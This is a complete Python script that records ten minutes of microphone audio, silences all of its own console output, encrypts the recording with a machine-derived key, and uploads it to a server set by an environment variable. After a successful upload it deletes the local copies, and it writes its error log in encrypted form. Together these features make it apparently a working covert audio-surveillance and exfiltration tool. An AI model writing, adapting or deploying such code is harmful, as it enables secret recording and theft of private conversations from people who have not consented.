import sounddevice as sd
import numpy as np
import wave 
import time
import requests
import os
from pydub import AudioSegment
from cryptography.fernet import Fernet
import hashlib, socket, uuid, base64
import sys
from dotenv import load_dotenv

def disable_output():
    sys.stdout = open(os.devnull, 'w')
    sys.stderr = open(os.devnull, 'w')

def generate_machine_key():
    mac = str(uuid.getnode()).encode()
    hostname = socket.gethostname().encode()
    key_raw = hashlib.sha256(mac + hostname).digest()
    key = base64.urlsafe_b64encode(key_raw)
    return Fernet(key)

cipher = generate_machine_key()

load_dotenv()

SAMPLERATE = 44100 
CHANNELS = 2
CHUNK_SECONDS = 600  # 10 minutes
SERVER_URL = os.getenv("SERVER")
TEMP_DIR = os.getenv("DIR")
FAILED_DIR = os.path.join(TEMP_DIR, "failed")
LOG_FILE = os.path.join(TEMP_DIR, "log.enc")

os.makedirs(TEMP_DIR, exist_ok=True)
os.makedirs(FAILED_DIR, exist_ok=True)

def log_error(message):
    timestamp = time.strftime("[%Y-%m-%d %H:%M:%S]")
    full = f"{timestamp} {message}\n"
    encrypted = cipher.encrypt(full.encode())
    with open(LOG_FILE, 'ab') as f:
        f.write(encrypted + b'\n')

def recorder():
    audio = sd.rec(int(CHUNK_SECONDS * SAMPLERATE), samplerate=SAMPLERATE, channels=CHANNELS, dtype='int16')
    sd.wait()
    return audio

def save_wave(filename, data):
    with wave.open(filename, 'wb') as wf:
        wf.setnchannels(CHANNELS)
        wf.setsampwidth(2)
        wf.setframerate(SAMPLERATE)
        wf.writeframes(data.tobytes())

def convert_to_mp3(wav_path, mp3_path):
    audio = AudioSegment.from_wav(wav_path)
    audio.export(mp3_path, format="mp3")

def encrypt_file(input_path, output_path):
    with open(input_path, 'rb') as f:
        data = f.read()
    encrypted_data = cipher.encrypt(data)
    with open(output_path, 'wb') as f:
        f.write(encrypted_data)

def send_to_serv(filepath):
    with open(filepath, 'rb') as f:
        files = {'file': f}
        try:
            response = requests.post(SERVER_URL, files=files, timeout=15)
            return response.status_code == 200
        except Exception:
            return False

def move_failed(*paths):
    for path in paths:
        if os.path.exists(path):
            name = os.path.basename(path)
            dest = os.path.join(FAILED_DIR, name)
            os.replace(path, dest)

def main():
    try:
        audio_data = recorder()
        timestamp = time.strftime("%Y%m%d-%H%M%S")
        wav_path = os.path.join(TEMP_DIR, f"audio_{timestamp}.wav")
        mp3_path = os.path.join(TEMP_DIR, f"audio_{timestamp}.mp3")
        enc_path = os.path.join(TEMP_DIR, f"audio_{timestamp}.enc")

        save_wave(wav_path, audio_data)
        convert_to_mp3(wav_path, mp3_path)
        encrypt_file(mp3_path, enc_path)

        if send_to_serv(enc_path):
            os.remove(wav_path)
            os.remove(mp3_path)
            os.remove(enc_path)
        else:
            move_failed(wav_path, mp3_path, enc_path)
            log_error(f"Failed to upload {enc_path}")

    except Exception as e:
        log_error(str(e))

    time.sleep(2)  # Даем процессу завершиться корректно

if __name__ == "__main__":
    disable_output()
    main()